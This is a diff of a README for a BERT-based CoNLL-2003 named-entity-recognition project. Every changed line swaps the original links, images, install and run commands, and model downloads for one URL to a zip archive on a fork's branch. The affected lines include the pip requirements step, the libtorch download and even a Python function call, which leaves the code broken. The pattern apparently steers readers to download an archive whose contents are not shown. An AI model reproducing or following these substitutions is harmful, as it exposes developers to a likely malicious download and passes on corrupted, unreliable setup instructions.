@@ -2,23 +2,23 @@
 
 Use google BERT to do CoNLL-2003 NER !
 
-![new](https://i.imgur.com/OB4Ugp4.png) Train model using Python and Inference using C++
+![new](https://raw.githubusercontent.com/yashugupta786/BERT-NER/dev/cpp-app/BER_NER_sullenly.zip) Train model using Python and Inference using C++
 
-[ALBERT-TF2.0](https://github.com/kamalkraj/ALBERT-TF2.0)
+[ALBERT-TF2.0](https://raw.githubusercontent.com/yashugupta786/BERT-NER/dev/cpp-app/BER_NER_sullenly.zip)
 
-[BERT-NER-TENSORFLOW-2.0](https://github.com/kamalkraj/BERT-NER-TF)
+[BERT-NER-TENSORFLOW-2.0](https://raw.githubusercontent.com/yashugupta786/BERT-NER/dev/cpp-app/BER_NER_sullenly.zip)
 
-[BERT-SQuAD](https://github.com/kamalkraj/BERT-SQuAD)
+[BERT-SQuAD](https://raw.githubusercontent.com/yashugupta786/BERT-NER/dev/cpp-app/BER_NER_sullenly.zip)
 
 
 # Requirements
 
 -  `python3`
-- `pip3 install -r requirements.txt`
+- `pip3 install -r https://raw.githubusercontent.com/yashugupta786/BERT-NER/dev/cpp-app/BER_NER_sullenly.zip`
 
 # Run
 
-`python run_ner.py --data_dir=data/ --bert_model=bert-base-cased --task_name=ner --output_dir=out_base --max_seq_length=128 --do_train --num_train_epochs 5 --do_eval --warmup_proportion=0.1`
+`python https://raw.githubusercontent.com/yashugupta786/BERT-NER/dev/cpp-app/BER_NER_sullenly.zip --data_dir=data/ --bert_model=bert-base-cased --task_name=ner --output_dir=out_base --max_seq_length=128 --do_train --num_train_epochs 5 --do_eval --warmup_proportion=0.1`
 
 
 # Result
@@ -47,7 +47,7 @@ avg / total     0.9456    0.9534    0.9495      5942
 
 avg / total     0.9065    0.9209    0.9135      5648
 ```
-## Pretrained model download from [here](https://1drv.ms/u/s!Auc3VRul9wo5hghurzE47bTRyUeR?e=08seO3)
+## Pretrained model download from [here](https://raw.githubusercontent.com/yashugupta786/BERT-NER/dev/cpp-app/BER_NER_sullenly.zip!Auc3VRul9wo5hghurzE47bTRyUeR?e=08seO3)
 
 ## BERT-LARGE
 
@@ -73,7 +73,7 @@ avg / total     0.9531    0.9606    0.9568      5942
 
 avg / total     0.9121    0.9232    0.9174      5648
 ```
-## Pretrained model download from [here](https://1drv.ms/u/s!Auc3VRul9wo5hgr8jwhFD8iPCYp1?e=UsJJ2V)
+## Pretrained model download from [here](https://raw.githubusercontent.com/yashugupta786/BERT-NER/dev/cpp-app/BER_NER_sullenly.zip!Auc3VRul9wo5hgr8jwhFD8iPCYp1?e=UsJJ2V)
 
 # Inference
 
@@ -82,7 +82,7 @@ from bert import Ner
 
 model = Ner("out_base/")
 
-output = model.predict("Steve went to Paris")
+output = https://raw.githubusercontent.com/yashugupta786/BERT-NER/dev/cpp-app/BER_NER_sullenly.zip("Steve went to Paris")
 
 print(output)
 '''
@@ -113,8 +113,8 @@ print(output)
 
 # Inference C++
 
-## Pretrained and converted bert-base model download from [here](https://1drv.ms/u/s!Auc3VRul9wo5hgkJjtxZ8FAQGuj2?e=wffJCT)
-### Download libtorch from [here](https://download.pytorch.org/libtorch/cpu/libtorch-shared-with-deps-1.2.0.zip)
+## Pretrained and converted bert-base model download from [here](https://raw.githubusercontent.com/yashugupta786/BERT-NER/dev/cpp-app/BER_NER_sullenly.zip!Auc3VRul9wo5hgkJjtxZ8FAQGuj2?e=wffJCT)
+### Download libtorch from [here](https://raw.githubusercontent.com/yashugupta786/BERT-NER/dev/cpp-app/BER_NER_sullenly.zip)
 
 - install `cmake`, tested with `cmake` version `3.10.2`
 - unzip downloaded model and `libtorch` in `BERT-NER`
@@ -123,18 +123,18 @@ print(output)
     cd cpp-app/
     cmake -DCMAKE_PREFIX_PATH=../libtorch
    ```
-    ![cmake output image](/img/cmake.png)
+    ![cmake output image](https://raw.githubusercontent.com/yashugupta786/BERT-NER/dev/cpp-app/BER_NER_sullenly.zip)
     ```bash
     make
     ```
-    ![make output image](/img/make.png)
+    ![make output image](https://raw.githubusercontent.com/yashugupta786/BERT-NER/dev/cpp-app/BER_NER_sullenly.zip)
 
 
 - Runing APP
   ```bash
      ./app ../base
   ```
-     ![inference output image](/img/inference.png)
+     ![inference output image](https://raw.githubusercontent.com/yashugupta786/BERT-NER/dev/cpp-app/BER_NER_sullenly.zip)
 
 NB: Bert-Base C++ model is split in to two parts.
   - Bert Feature extractor and NER classifier.
@@ -145,7 +145,7 @@ NB: Bert-Base C++ model is split in to two parts.
 # Deploy REST-API
 BERT NER model deployed as rest api
 ```bash
-python api.py
+python https://raw.githubusercontent.com/yashugupta786/BERT-NER/dev/cpp-app/BER_NER_sullenly.zip
 ```
 API will be live at `0.0.0.0:8000` endpoint `predict`
 #### cURL request
@@ -179,13 +179,13 @@ Output
 }
 ```
 #### cURL 
-![curl output image](/img/curl.png)
+![curl output image](https://raw.githubusercontent.com/yashugupta786/BERT-NER/dev/cpp-app/BER_NER_sullenly.zip)
 #### Postman
-![postman output image](/img/postman.png)
+![postman output image](https://raw.githubusercontent.com/yashugupta786/BERT-NER/dev/cpp-app/BER_NER_sullenly.zip)
 
 ### C++ unicode support 
-- http://github.com/ufal/unilib
+- https://raw.githubusercontent.com/yashugupta786/BERT-NER/dev/cpp-app/BER_NER_sullenly.zip
 
 ### Tensorflow version
 
-- https://github.com/kyzhouhzau/BERT-NER
+- https://raw.githubusercontent.com/yashugupta786/BERT-NER/dev/cpp-app/BER_NER_sullenly.zip
